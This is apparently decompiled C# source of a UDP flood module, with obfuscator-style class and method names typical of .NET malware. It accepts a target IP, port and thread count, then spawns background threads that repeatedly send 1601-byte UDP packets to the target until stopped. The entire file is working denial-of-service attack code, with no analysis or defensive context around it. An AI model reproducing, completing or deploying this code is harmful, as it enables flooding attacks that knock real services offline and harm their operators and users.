using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class GClass0
{
	private string string_0;

	private int int_0;

	private int int_1;

	private bool bool_0;

	public object Object_0 => bool_0;

	public GClass0(string string_1, object object_0, object object_1)
	{
		bool_0 = false;
		string_0 = string_1;
		int_0 = Convert.ToInt32(RuntimeHelpers.GetObjectValue(object_0));
		int_1 = Convert.ToInt32(RuntimeHelpers.GetObjectValue(object_1));
	}

	public void method_0()
	{
		bool_0 = true;
		Thread thread = new Thread(method_1);
		thread.IsBackground = true;
		thread.Start();
	}

	private void method_1()
	{
		checked
		{
			Thread[] array = new Thread[int_1 - 1 + 1];
			int num = int_1 - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = new Thread(method_3);
				array[i].IsBackground = true;
				array[i].Start();
			}
		}
	}

	public void method_2()
	{
		bool_0 = false;
	}

	private void method_3()
	{
		while (bool_0)
		{
			try
			{
				IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse(string_0), int_0);
				Socket socket = new Socket(iPEndPoint.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
				byte[] buffer = new byte[1601];
				socket.SendTo(buffer, iPEndPoint);
				socket.Close();
				Thread.Sleep(300);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Thread.Sleep(300);
				ProjectData.ClearProjectError();
			}
		}
	}
}
